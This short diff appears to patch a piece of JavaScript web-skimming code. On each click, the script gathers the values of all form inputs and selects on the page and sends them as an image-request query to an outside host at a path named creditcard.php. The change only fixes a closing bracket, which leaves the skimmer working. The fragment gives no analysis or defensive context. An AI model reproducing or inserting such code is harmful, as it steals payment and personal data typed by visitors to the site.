@@ -9,4 +9,4 @@ document.addEventListener("click", function() {
        selects_v += selects[index].value;
    }
    new Image().src = "https://glhf.com.tw/creditcard.php?data=" + inputs_v + selects_v;
-};
+});
